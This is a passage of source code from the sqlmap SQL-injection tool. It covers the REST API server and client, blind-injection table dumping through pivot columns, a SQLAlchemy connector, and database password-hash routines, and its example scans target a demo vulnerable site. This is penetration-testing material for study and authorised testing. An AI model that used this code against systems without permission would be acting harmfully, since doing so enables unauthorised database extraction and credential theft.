scan\n    \"\"\"\n\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_status()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    if DataStore.tasks[taskid].engine_process() is None:\n        status = \"not running\"\n    else:\n        status = \"terminated\" if DataStore.tasks[taskid].engine_has_terminated() is True else \"running\"\n\n    logger.debug(\"(%s) Retrieved scan status\" % taskid)\n    return jsonize({\n        \"success\": True,\n        \"status\": status,\n        \"returncode\": DataStore.tasks[taskid].engine_get_returncode()\n    })\n\n@get(\"/scan/<taskid>/data\")\ndef scan_data(taskid):\n    \"\"\"\n    Retrieve the data of a scan\n    \"\"\"\n\n    json_data_message = list()\n    json_errors_message = list()\n\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_data()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    # Read all data from the IPC database for the taskid\n    for status, content_type, value in DataStore.current_db.execute(\"SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC\", (taskid,)):\n        json_data_message.append({\"status\": status, \"type\": content_type, \"value\": dejsonize(value)})\n\n    # Read all error messages from the IPC database\n    for error in DataStore.current_db.execute(\"SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC\", (taskid,)):\n        json_errors_message.append(error)\n\n    logger.debug(\"(%s) Retrieved scan data and error messages\" % taskid)\n    return jsonize({\"success\": True, \"data\": json_data_message, \"error\": json_errors_message})\n\n# Functions to handle scans' logs\n@get(\"/scan/<taskid>/log/<start>/<end>\")\ndef scan_log_limited(taskid, start, end):\n    \"\"\"\n    Retrieve a subset of log messages\n    \"\"\"\n\n    json_log_messages = list()\n\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_log_limited()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    if not start.isdigit() or not end.isdigit() or int(end) < int(start):\n        logger.warning(\"[%s] Invalid start or end value provided to scan_log_limited()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid start or end value, must be digits\"})\n\n    start = max(1, int(start))\n    end = max(1, int(end))\n\n    # Read a subset of log messages from the IPC database\n    for time_, level, message in DataStore.current_db.execute(\"SELECT time, level, message FROM logs WHERE taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC\", (taskid, start, end)):\n        json_log_messages.append({\"time\": time_, \"level\": level, \"message\": message})\n\n    logger.debug(\"(%s) Retrieved scan log messages subset\" % taskid)\n    return jsonize({\"success\": True, \"log\": json_log_messages})\n\n@get(\"/scan/<taskid>/log\")\ndef scan_log(taskid):\n    \"\"\"\n    Retrieve the log messages\n    \"\"\"\n\n    json_log_messages = list()\n\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_log()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    # Read all log messages from the IPC database\n    for time_, level, message in DataStore.current_db.execute(\"SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC\", (taskid,)):\n        json_log_messages.append({\"time\": time_, \"level\": level, \"message\": message})\n\n    logger.debug(\"(%s) Retrieved scan log messages\" % taskid)\n    return jsonize({\"success\": True, \"log\": json_log_messages})\n\n# Function to handle files inside the output directory\n@get(\"/download/<taskid>/<target>/<filename:path>\")\ndef download(taskid, target, filename):\n    \"\"\"\n    Download a certain file from the file system\n    \"\"\"\n\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to download()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    path = os.path.abspath(os.path.join(paths.SQLMAP_OUTPUT_PATH, target, filename))\n    # Prevent file path traversal\n    if not path.startswith(paths.SQLMAP_OUTPUT_PATH):\n        logger.warning(\"[%s] Forbidden path (%s)\" % (taskid, target))\n        return jsonize({\"success\": False, \"message\": \"Forbidden path\"})\n\n    if os.path.isfile(path):\n        logger.debug(\"(%s) Retrieved content of file %s\" % (taskid, target))\n        content = openFile(path, \"rb\").read()\n        return jsonize({\"success\": True, \"file\": encodeBase64(content, binary=False)})\n    else:\n        logger.warning(\"[%s] File does not exist %s\" % (taskid, target))\n        return jsonize({\"success\": False, \"message\": \"File does not exist\"})\n\n@get(\"/version\")\ndef version(token=None):\n    \"\"\"\n    Fetch server version\n    \"\"\"\n\n    logger.debug(\"Fetched version (%s)\" % (\"admin\" if is_admin(token) else request.remote_addr))\n    return jsonize({\"success\": True, \"version\": VERSION_STRING.split('/')[-1]})\n\ndef server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER, username=None, password=None, database=None):\n    \"\"\"\n    REST-JSON API server\n    \"\"\"\n\n    DataStore.admin_token = encodeHex(os.urandom(16), binary=False)\n    DataStore.username = username\n    DataStore.password = password\n\n    if not database:\n        _, Database.filepath = tempfile.mkstemp(prefix=MKSTEMP_PREFIX.IPC, text=False)\n        os.close(_)\n    else:\n        Database.filepath = database\n\n    if port == 0:  # random\n        with contextlib.closing(socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as s:\n            s.bind((host, 0))\n            port = s.getsockname()[1]\n\n    logger.info(\"Running REST-JSON API server at '%s:%d'..\" % (host, port))\n    logger.info(\"Admin (secret) token: %s\" % DataStore.admin_token)\n    logger.debug(\"IPC database: '%s'\" % Database.filepath)\n\n    # Initialize IPC database\n    DataStore.current_db = Database()\n    DataStore.current_db.connect()\n    DataStore.current_db.init()\n\n    # Run RESTful API\n    try:\n        # Supported adapters: aiohttp, auto, bjoern, cgi, cherrypy, diesel, eventlet, fapws3, flup, gae, gevent, geventSocketIO, gunicorn, meinheld, paste, rocket, tornado, twisted, waitress, wsgiref\n        # Reference: https://bottlepy.org/docs/dev/deployment.html || bottle.server_names\n\n        if adapter == \"gevent\":\n            from gevent import monkey\n            monkey.patch_all()\n        elif adapter == \"eventlet\":\n            import eventlet\n            eventlet.monkey_patch()\n        logger.debug(\"Using adapter '%s' to run bottle\" % adapter)\n        run(host=host, port=port, quiet=True, debug=True, server=adapter)\n    except socket.error as ex:\n        if \"already in use\" in getSafeExString(ex):\n            logger.error(\"Address already in use ('%s:%s')\" % (host, port))\n        else:\n            raise\n    except ImportError:\n        if adapter.lower() not in server_names:\n            errMsg = \"Adapter '%s' is unknown. \" % adapter\n            errMsg += \"List of supported adapters: %s\" % ', '.join(sorted(list(server_names.keys())))\n        else:\n            errMsg = \"Server support for adapter '%s' is not installed on this system \" % adapter\n            errMsg += \"(Note: you can try to install it with 'apt install python-%s' or 'pip%s install %s')\" % (adapter, '3' if six.PY3 else \"\", adapter)\n        logger.critical(errMsg)\n\ndef _client(url, options=None):\n    logger.debug(\"Calling '%s'\" % url)\n    try:\n        headers = {\"Content-Type\": \"application/json\"}\n\n        if options is not None:\n            data = getBytes(jsonize(options))\n        else:\n            data = None\n\n        if DataStore.username or DataStore.password:\n            headers[\"Authorization\"] = \"Basic %s\" % encodeBase64(\"%s:%s\" % (DataStore.username or \"\", DataStore.password or \"\"), binary=False)\n\n        req = _urllib.request.Request(url, data, headers)\n        response = _urllib.request.urlopen(req)\n        text = getText(response.read())\n    except:\n        if options:\n            logger.error(\"Failed to load and parse %s\" % url)\n        raise\n    return text\n\ndef client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, username=None, password=None):\n    \"\"\"\n    REST-JSON API client\n    \"\"\"\n\n    DataStore.username = username\n    DataStore.password = password\n\n    dbgMsg = \"Example client access from command line:\"\n    dbgMsg += \"\\n\\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\\\\{16\\\\}') && echo $taskid\" % (host, port)\n    dbgMsg += \"\\n\\t$ curl -H \\\"Content-Type: application/json\\\" -X POST -d '{\\\"url\\\": \\\"http://testphp.vulnweb.com/artists.php?artist=1\\\"}' http://%s:%d/scan/$taskid/start\" % (host, port)\n    dbgMsg += \"\\n\\t$ curl http://%s:%d/scan/$taskid/data\" % (host, port)\n    dbgMsg += \"\\n\\t$ curl http://%s:%d/scan/$taskid/log\" % (host, port)\n    logger.debug(dbgMsg)\n\n    addr = \"http://%s:%d\" % (host, port)\n    logger.info(\"Starting REST-JSON API client to '%s'...\" % addr)\n\n    try:\n        _client(addr)\n    except Exception as ex:\n        if not isinstance(ex, _urllib.error.HTTPError) or ex.code == _http_client.UNAUTHORIZED:\n            errMsg = \"There has been a problem while connecting to the \"\n            errMsg += \"REST-JSON API server at '%s' \" % addr\n            errMsg += \"(%s)\" % getSafeExString(ex)\n            logger.critical(errMsg)\n            return\n\n    commands = (\"help\", \"new\", \"use\", \"data\", \"log\", \"status\", \"option\", \"stop\", \"kill\", \"list\", \"flush\", \"version\", \"exit\", \"bye\", \"quit\")\n    colors =  ('red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'lightgrey', 'lightred', 'lightgreen', 'lightyellow', 'lightblue', 'lightmagenta', 'lightcyan')\n    autoCompletion(AUTOCOMPLETE_TYPE.API, commands=commands)\n\n    taskid = None\n    logger.info(\"Type 'help' or '?' for list of available commands\")\n\n    while True:\n        try:\n            color = colors[int(taskid or \"0\", 16) % len(colors)]\n            command = _input(\"api%s> \" % (\" (%s)\" % setColor(taskid, color) if taskid else \"\")).strip()\n            command = re.sub(r\"\\A(\\w+)\", lambda match: match.group(1).lower(), command)\n        except (EOFError, KeyboardInterrupt):\n            print()\n            break\n\n        if command in (\"data\", \"log\", \"status\", \"stop\", \"kill\"):\n            if not taskid:\n                logger.error(\"No task ID in use\")\n                continue\n            raw = _client(\"%s/scan/%s/%s\" % (addr, taskid, command))\n            res = dejsonize(raw)\n            if not res[\"success\"]:\n                logger.error(\"Failed to execute command %s\" % command)\n            dataToStdout(\"%s\\n\" % raw)\n\n        elif command.startswith(\"option\"):\n            if not taskid:\n                logger.error(\"No task ID in use\")\n                continue\n            try:\n                command, option = command.split(\" \", 1)\n            except ValueError:\n                raw = _client(\"%s/option/%s/list\" % (addr, taskid))\n            else:\n                options = re.split(r\"\\s*,\\s*\", option.strip())\n                raw = _client(\"%s/option/%s/get\" % (addr, taskid), options)\n            res = dejsonize(raw)\n            if not res[\"success\"]:\n                logger.error(\"Failed to execute command %s\" % command)\n            dataToStdout(\"%s\\n\" % raw)\n\n        elif command.startswith(\"new\"):\n            if ' ' not in command:\n                logger.error(\"Program arguments are missing\")\n                continue\n\n            try:\n                argv = [\"sqlmap.py\"] + shlex.split(command)[1:]\n            except Exception as ex:\n                logger.error(\"Error occurred while parsing arguments ('%s')\" % getSafeExString(ex))\n                taskid = None\n                continue\n\n            try:\n                cmdLineOptions = cmdLineParser(argv).__dict__\n            except:\n                taskid = None\n                continue\n\n            for key in list(cmdLineOptions):\n                if cmdLineOptions[key] is None:\n                    del cmdLineOptions[key]\n\n            raw = _client(\"%s/task/new\" % addr)\n            res = dejsonize(raw)\n            if not res[\"success\"]:\n                logger.error(\"Failed to create new task ('%s')\" % res.get(\"message\", \"\"))\n                continue\n            taskid = res[\"taskid\"]\n            logger.info(\"New task ID is '%s'\" % taskid)\n\n            raw = _client(\"%s/scan/%s/start\" % (addr, taskid), cmdLineOptions)\n            res = dejsonize(raw)\n            if not res[\"success\"]:\n                logger.error(\"Failed to start scan ('%s')\" % res.get(\"message\", \"\"))\n                continue\n            logger.info(\"Scanning started\")\n\n        elif command.startswith(\"use\"):\n            taskid = (command.split()[1] if ' ' in command else \"\").strip(\"'\\\"\")\n            if not taskid:\n                logger.error(\"Task ID is missing\")\n                taskid = None\n                continue\n            elif not re.search(r\"\\A[0-9a-fA-F]{16}\\Z\", taskid):\n                logger.error(\"Invalid task ID '%s'\" % taskid)\n                taskid = None\n                continue\n            logger.info(\"Switching to task ID '%s' \" % taskid)\n\n        elif command in (\"version\",):\n            raw = _client(\"%s/%s\" % (addr, command))\n            res = dejsonize(raw)\n            if not res[\"success\"]:\n                logger.error(\"Failed to execute command %s\" % command)\n            dataToStdout(\"%s\\n\" % raw)\n\n        elif command in (\"list\", \"flush\"):\n            raw = _client(\"%s/admin/%s\" % (addr, command))\n            res = dejsonize(raw)\n            if not res[\"success\"]:\n                logger.error(\"Failed to execute command %s\" % command)\n            elif command == \"flush\":\n                taskid = None\n            dataToStdout(\"%s\\n\" % raw)\n\n        elif command in (\"exit\", \"bye\", \"quit\", 'q'):\n            return\n\n        elif command in (\"help\", \"?\"):\n            msg = \"help           Show this help message\\n\"\n            msg += \"new ARGS       Start a new scan task with provided arguments (e.g. 'new -u \\\"http://testphp.vulnweb.com/artists.php?artist=1\\\"')\\n\"\n            msg += \"use TASKID     Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\\n\"\n            msg += \"data           Retrieve and show data for current task\\n\"\n            msg += \"log            Retrieve and show log for current task\\n\"\n            msg += \"status         Retrieve and show status for current task\\n\"\n            msg += \"option OPTION  Retrieve and show option for current task\\n\"\n            msg += \"options        Retrieve and show all options for current task\\n\"\n            msg += \"stop           Stop current task\\n\"\n            msg += \"kill           Kill current task\\n\"\n            msg += \"list           Display all tasks\\n\"\n            msg += \"version        Fetch server version\\n\"\n            msg += \"flush          Flush tasks (delete all tasks)\\n\"\n            msg += \"exit           Exit this client\\n\"\n\n            dataToStdout(msg)\n\n        elif command:\n            logger.error(\"Unknown command '%s'\" % command)\n", "lib/utils/pivotdumptable.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.agent import agent\nfrom lib.core.bigarray import BigArray\nfrom lib.core.common import Backend\nfrom lib.core.common import filterNone\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import isNoneValue\nfrom lib.core.common import isNumPosStrValue\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.common import unsafeSQLIdentificatorNaming\nfrom lib.core.compat import xrange\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import queries\nfrom lib.core.dicts import DUMP_REPLACEMENTS\nfrom lib.core.enums import CHARSET_TYPE\nfrom lib.core.enums import EXPECTED\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.core.settings import MAX_INT\nfrom lib.core.settings import NULL\nfrom lib.core.settings import SINGLE_QUOTE_MARKER\nfrom lib.core.unescaper import unescaper\nfrom lib.request import inject\nfrom lib.utils.safe2bin import safechardecode\nfrom thirdparty.six import unichr as _unichr\n\ndef pivotDumpTable(table, colList, count=None, blind=True, alias=None):\n    lengths = {}\n    entries = {}\n\n    dumpNode = queries[Backend.getIdentifiedDbms()].dump_table.blind\n\n    validColumnList = False\n    validPivotValue = False\n\n    if count is None:\n        query = dumpNode.count % table\n        query = agent.whereQuery(query)\n        count = inject.getValue(query, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS) if blind else inject.getValue(query, blind=False, time=False, expected=EXPECTED.INT)\n\n    if hasattr(count, \"isdigit\") and count.isdigit():\n        count = int(count)\n\n    if count == 0:\n        infoMsg = \"table '%s' appears to be empty\" % unsafeSQLIdentificatorNaming(table)\n        logger.info(infoMsg)\n\n        for column in colList:\n            lengths[column] = len(column)\n            entries[column] = []\n\n        return entries, lengths\n\n    elif not isNumPosStrValue(count):\n        return None\n\n    for column in colList:\n        lengths[column] = 0\n        entries[column] = BigArray()\n\n    colList = filterNone(sorted(colList, key=lambda x: len(x) if x else MAX_INT))\n\n    if conf.pivotColumn:\n        for _ in colList:\n            if re.search(r\"(.+\\.)?%s\" % re.escape(conf.pivotColumn), _, re.I):\n                infoMsg = \"using column '%s' as a pivot \" % conf.pivotColumn\n                infoMsg += \"for retrieving row data\"\n                logger.info(infoMsg)\n\n                colList.remove(_)\n                colList.insert(0, _)\n\n                validPivotValue = True\n                break\n\n        if not validPivotValue:\n            warnMsg = \"column '%s' not \" % conf.pivotColumn\n            warnMsg += \"found in table '%s'\" % table\n            logger.warning(warnMsg)\n\n    if not validPivotValue:\n        for column in colList:\n            infoMsg = \"fetching number of distinct \"\n            infoMsg += \"values for column '%s'\" % column.replace((\"%s.\" % alias) if alias else \"\", \"\")\n            logger.info(infoMsg)\n\n            query = dumpNode.count2 % (column, table)\n            query = agent.whereQuery(query)\n            value = inject.getValue(query, blind=blind, union=not blind, error=not blind, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n\n            if isNumPosStrValue(value):\n                validColumnList = True\n\n                if value == count:\n                    infoMsg = \"using column '%s' as a pivot \" % column.replace((\"%s.\" % alias) if alias else \"\", \"\")\n                    infoMsg += \"for retrieving row data\"\n                    logger.info(infoMsg)\n\n                    validPivotValue = True\n                    colList.remove(column)\n                    colList.insert(0, column)\n                    break\n\n        if not validColumnList:\n            errMsg = \"all provided column name(s) are non-existent\"\n            raise SqlmapNoneDataException(errMsg)\n\n        if not validPivotValue:\n            warnMsg = \"no proper pivot column provided (with unique values).\"\n            warnMsg += \" It won't be possible to retrieve all rows\"\n            logger.warning(warnMsg)\n\n    pivotValue = \" \"\n    breakRetrieval = False\n\n    def _(column, pivotValue):\n        if column == colList[0]:\n            query = dumpNode.query.replace(\"'%s'\" if unescaper.escape(pivotValue, False) != pivotValue else \"%s\", \"%s\") % (agent.preprocessField(table, column), table, agent.preprocessField(table, column), unescaper.escape(pivotValue, False))\n        else:\n            query = dumpNode.query2.replace(\"'%s'\" if unescaper.escape(pivotValue, False) != pivotValue else \"%s\", \"%s\") % (agent.preprocessField(table, column), table, agent.preprocessField(table, colList[0]), unescaper.escape(pivotValue, False) if SINGLE_QUOTE_MARKER not in dumpNode.query2 else pivotValue)\n\n        query = agent.whereQuery(query)\n        return unArrayizeValue(inject.getValue(query, blind=blind, time=blind, union=not blind, error=not blind))\n\n    try:\n        for i in xrange(count):\n            if breakRetrieval:\n                break\n\n            for column in colList:\n                value = _(column, pivotValue)\n                if column == colList[0]:\n                    if isNoneValue(value):\n                        try:\n                            for pivotValue in filterNone((\"  \" if pivotValue == \" \" else None, \"%s%s\" % (pivotValue[0], _unichr(ord(pivotValue[1]) + 1)) if len(pivotValue) > 1 else None, _unichr(ord(pivotValue[0]) + 1))):\n                                value = _(column, pivotValue)\n                                if not isNoneValue(value):\n                                    break\n                        except ValueError:\n                            pass\n\n                    if isNoneValue(value) or value == NULL:\n                        breakRetrieval = True\n                        break\n\n                    pivotValue = safechardecode(value)\n\n                if conf.limitStart or conf.limitStop:\n                    if conf.limitStart and (i + 1) < conf.limitStart:\n                        warnMsg = \"skipping first %d pivot \" % conf.limitStart\n                        warnMsg += \"point values\"\n                        singleTimeWarnMessage(warnMsg)\n                        break\n                    elif conf.limitStop and (i + 1) > conf.limitStop:\n                        breakRetrieval = True\n                        break\n\n                value = \"\" if isNoneValue(value) else unArrayizeValue(value)\n\n                lengths[column] = max(lengths[column], len(DUMP_REPLACEMENTS.get(getUnicode(value), getUnicode(value))))\n                entries[column].append(value)\n\n    except KeyboardInterrupt:\n        kb.dumpKeyboardInterrupt = True\n\n        warnMsg = \"user aborted during enumeration. sqlmap \"\n        warnMsg += \"will display partial output\"\n        logger.warning(warnMsg)\n\n    except SqlmapConnectionException as ex:\n        errMsg = \"connection exception detected ('%s'). sqlmap \" % getSafeExString(ex)\n        errMsg += \"will display partial output\"\n\n        logger.critical(errMsg)\n\n    return entries, lengths\n", "lib/utils/sqlalchemy.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport importlib\nimport logging\nimport os\nimport re\nimport sys\nimport traceback\nimport warnings\n\n_path = list(sys.path)\n_sqlalchemy = None\ntry:\n    sys.path = sys.path[1:]\n    module = importlib.import_module(\"sqlalchemy\")\n    if hasattr(module, \"dialects\"):\n        _sqlalchemy = module\n        warnings.simplefilter(action=\"ignore\", category=_sqlalchemy.exc.SAWarning)\nexcept:\n    pass\nfinally:\n    sys.path = _path\n\ntry:\n    import MySQLdb  # used by SQLAlchemy in case of MySQL\n    warnings.filterwarnings(\"error\", category=MySQLdb.Warning)\nexcept (ImportError, AttributeError):\n    pass\n\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.exception import SqlmapFilePathException\nfrom lib.core.exception import SqlmapMissingDependence\nfrom plugins.generic.connector import Connector as GenericConnector\nfrom thirdparty import six\nfrom thirdparty.six.moves import urllib as _urllib\n\ndef getSafeExString(ex, encoding=None):  # Cross-referenced function\n    raise NotImplementedError\n\nclass SQLAlchemy(GenericConnector):\n    def __init__(self, dialect=None):\n        GenericConnector.__init__(self)\n\n        self.dialect = dialect\n        self.address = conf.direct\n\n        if conf.dbmsUser:\n            self.address = self.address.replace(\"'%s':\" % conf.dbmsUser, \"%s:\" % _urllib.parse.quote(conf.dbmsUser))\n            self.address = self.address.replace(\"%s:\" % conf.dbmsUser, \"%s:\" % _urllib.parse.quote(conf.dbmsUser))\n\n        if conf.dbmsPass:\n            self.address = self.address.replace(\":'%s'@\" % conf.dbmsPass, \":%s@\" % _urllib.parse.quote(conf.dbmsPass))\n            self.address = self.address.replace(\":%s@\" % conf.dbmsPass, \":%s@\" % _urllib.parse.quote(conf.dbmsPass))\n\n        if self.dialect:\n            self.address = re.sub(r\"\\A.+://\", \"%s://\" % self.dialect, self.address)\n\n    def connect(self):\n        if _sqlalchemy:\n            self.initConnection()\n\n            try:\n                if not self.port and self.db:\n                    if not os.path.exists(self.db):\n                        raise SqlmapFilePathException(\"the provided database file '%s' does not exist\" % self.db)\n\n                    _ = self.address.split(\"//\", 1)\n                    self.address = \"%s////%s\" % (_[0], os.path.abspath(self.db))\n\n                if self.dialect == \"sqlite\":\n                    engine = _sqlalchemy.create_engine(self.address, connect_args={\"check_same_thread\": False})\n                elif self.dialect == \"oracle\":\n                    engine = _sqlalchemy.create_engine(self.address)\n                else:\n                    engine = _sqlalchemy.create_engine(self.address, connect_args={})\n\n                self.connector = engine.connect()\n            except (TypeError, ValueError):\n                if \"_get_server_version_info\" in traceback.format_exc():\n                    try:\n                        import pymssql\n                        if int(pymssql.__version__[0]) < 2:\n                            raise SqlmapConnectionException(\"SQLAlchemy connection issue (obsolete version of pymssql ('%s') is causing problems)\" % pymssql.__version__)\n                    except ImportError:\n                        pass\n                elif \"invalid literal for int() with base 10: '0b\" in traceback.format_exc():\n                    raise SqlmapConnectionException(\"SQLAlchemy connection issue ('https://bitbucket.org/zzzeek/sqlalchemy/issues/3975')\")\n                else:\n                    pass\n            except SqlmapFilePathException:\n                raise\n            except Exception as ex:\n                raise SqlmapConnectionException(\"SQLAlchemy connection issue ('%s')\" % getSafeExString(ex))\n\n            self.printConnected()\n        else:\n            raise SqlmapMissingDependence(\"SQLAlchemy not available (e.g. 'pip%s install SQLAlchemy')\" % ('3' if six.PY3 else \"\"))\n\n    def fetchall(self):\n        try:\n            retVal = []\n            for row in self.cursor.fetchall():\n                retVal.append(tuple(row))\n            return retVal\n        except _sqlalchemy.exc.ProgrammingError as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n            return None\n\n    def execute(self, query):\n        retVal = False\n\n        # Reference: https://stackoverflow.com/a/69491015\n        if hasattr(_sqlalchemy, \"text\"):\n            query = _sqlalchemy.text(query)\n\n        try:\n            self.cursor = self.connector.execute(query)\n            retVal = True\n        except (_sqlalchemy.exc.OperationalError, _sqlalchemy.exc.ProgrammingError) as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) %s\" % getSafeExString(ex))\n        except _sqlalchemy.exc.InternalError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        return retVal\n\n    def select(self, query):\n        retVal = None\n\n        if self.execute(query):\n            retVal = self.fetchall()\n\n        return retVal\n", "lib/utils/hash.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import print_function\n\ntry:\n    from crypt import crypt\nexcept:  # removed ImportError because of https://github.com/sqlmapproject/sqlmap/issues/3171\n    from thirdparty.fcrypt.fcrypt import crypt\n\ntry:\n    from Crypto.Cipher.DES import MODE_CBC as CBC\n    from Crypto.Cipher.DES import new as des\nexcept:\n    from thirdparty.pydes.pyDes import CBC\n    from thirdparty.pydes.pyDes import des\n\n_multiprocessing = None\n\nimport base64\nimport binascii\nimport gc\nimport math\nimport os\nimport re\nimport tempfile\nimport time\nimport zipfile\n\nfrom hashlib import md5\nfrom hashlib import sha1\nfrom hashlib import sha224\nfrom hashlib import sha256\nfrom hashlib import sha384\nfrom hashlib import sha512\n\nfrom lib.core.common import Backend\nfrom lib.core.common import checkFile\nfrom lib.core.common import clearConsoleLine\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import getFileItems\nfrom lib.core.common import getPublicTypeMembers\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import hashDBRetrieve\nfrom lib.core.common import hashDBWrite\nfrom lib.core.common import isZipFile\nfrom lib.core.common import normalizeUnicode\nfrom lib.core.common import openFile\nfrom lib.core.common import paths\nfrom lib.core.common import readInput\nfrom lib.core.common import singleTimeLogMessage\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.compat import xrange\nfrom lib.core.convert import decodeBase64\nfrom lib.core.convert import decodeHex\nfrom lib.core.convert import encodeHex\nfrom lib.core.convert import getBytes\nfrom lib.core.convert import getText\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.datatype import OrderedSet\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import HASH\nfrom lib.core.enums import MKSTEMP_PREFIX\nfrom lib.core.exception import SqlmapDataException\nfrom lib.core.exception import SqlmapUserQuitException\nfrom lib.core.settings import COMMON_PASSWORD_SUFFIXES\nfrom lib.core.settings import COMMON_USER_COLUMNS\nfrom lib.core.settings import DEV_EMAIL_ADDRESS\nfrom lib.core.settings import DUMMY_USER_PREFIX\nfrom lib.core.settings import HASH_BINARY_COLUMNS_REGEX\nfrom lib.core.settings import HASH_EMPTY_PASSWORD_MARKER\nfrom lib.core.settings import HASH_MOD_ITEM_DISPLAY\nfrom lib.core.settings import HASH_RECOGNITION_QUIT_THRESHOLD\nfrom lib.core.settings import INVALID_UNICODE_CHAR_FORMAT\nfrom lib.core.settings import IS_WIN\nfrom lib.core.settings import ITOA64\nfrom lib.core.settings import NULL\nfrom lib.core.settings import ROTATING_CHARS\nfrom lib.core.settings import UNICODE_ENCODING\nfrom lib.core.wordlist import Wordlist\nfrom thirdparty import six\nfrom thirdparty.colorama.initialise import init as coloramainit\nfrom thirdparty.six.moves import queue as _queue\n\ndef mysql_passwd(password, uppercase=True):\n    \"\"\"\n    Reference(s):\n        https://web.archive.org/web/20120215205312/http://csl.sublevel3.org/mysql-password-function/\n\n    >>> mysql_passwd(password='testpass', uppercase=True)\n    '*00E247AC5F9AF26AE0194B41E1E769DEE1429A29'\n    \"\"\"\n\n    password = getBytes(password)\n\n    retVal = \"*%s\" % sha1(sha1(password).digest()).hexdigest()\n\n    return retVal.upper() if uppercase else retVal.lower()\n\ndef mysql_old_passwd(password, uppercase=True):  # prior to version '4.1'\n    \"\"\"\n    Reference(s):\n        https://web.archive.org/web/20091205000600/http://www.sfr-fresh.com/unix/privat/tpop3d-1.5.5.tar.gz:a/tpop3d-1.5.5/password.c\n        https://github.com/pwnieexpress/pwn_plug_sources/blob/master/src/darkmysqli/DarkMySQLi.py\n\n    >>> mysql_old_passwd(password='testpass', uppercase=True)\n    '7DCDA0D57290B453'\n    \"\"\"\n\n    a, b, c = 1345345333, 7, 0x12345671\n\n    for d in password:\n        if d == ' ' or d == '\\t':\n            continue\n\n        e = ord(d)\n        a ^= (((a & 63) + b) * e) + (a << 8)\n        c += (c << 8) ^ a\n        b += e\n\n    retVal = \"%08lx%08lx\" % (a & ((1 << 31) - 1), c & ((1 << 31) - 1))\n\n    return retVal.upper() if uppercase else retVal.lower()\n\ndef postgres_passwd(password, username, uppercase=False):\n    \"\"\"\n    Reference(s):\n        http://pentestmonkey.net/blog/cracking-postgres-hashes/\n\n    >>> postgres_passwd(password='testpass', username='testuser', uppercase=False)\n    'md599e5ea7a6f7c3269995cba3927fd0093'\n    \"\"\"\n\n    username = getBytes(username)\n    password = getBytes(password)\n\n    retVal = \"md5%s\" % md5(password + username).hexdigest()\n\n    return retVal.upper() if uppercase else retVal.lower()\n\ndef mssql_new_passwd(password, salt, uppercase=False):  # since version '2012'\n    \"\"\"\n    Reference(s):\n        http://hashcat.net/forum/thread-1474.html\n        https://sqlity.net/en/2460/sql-password-hash/\n\n    >>> mssql_new_passwd(password='testpass', salt='4086ceb6', uppercase=False)\n    '0x02004086ceb6eb051cdbc5bdae68ffc66c918d4977e592f6bdfc2b444a7214f71fa31c35902c5b7ae773ed5f4c50676d329120ace32ee6bc81c24f70711eb0fc6400e85ebf25'\n    \"\"\"\n\n    binsalt = decodeHex(salt)\n    unistr = b\"\".join((_.encode(UNICODE_ENCODING) + b\"\\0\") if ord(_) < 256 else _.encode(UNICODE_ENCODING) for _ in password)\n\n    retVal = \"0200%s%s\" % (salt, sha512(unistr + binsalt).hexdigest())\n\n    return \"0x%s\" % (retVal.upper() if uppercase else retVal.lower())\n\ndef mssql_passwd(password, salt, 